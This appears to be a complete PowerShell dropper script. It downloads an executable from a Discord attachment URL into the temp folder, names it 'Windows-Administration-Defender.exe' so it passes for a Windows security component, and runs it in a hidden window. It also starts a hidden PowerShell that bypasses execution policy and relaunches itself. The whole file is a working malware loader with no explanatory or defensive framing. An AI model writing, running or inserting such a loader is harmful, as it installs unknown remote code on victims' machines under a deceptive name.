$batUrl = "https://cdn.discordapp.com/attachments/1150287533213753354/1150792818990788750/Windows-Administration-Defender.exe" 
$batPath = [System.IO.Path]::Combine($env:TEMP, "Windows-Administration-Defender.exe") 
iwr -Uri $batUrl -OutFile $batPath 
 
$psScript = { 
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait 
} 
 
$psJob = Start-Job -ScriptBlock $psScript 
 
if (Test-Path $batPath) { 
    Start-Process -FilePath $batPath -WindowStyle Hidden 
} 
 
$psJob | Wait-Job 
$psJob | Remove-Job
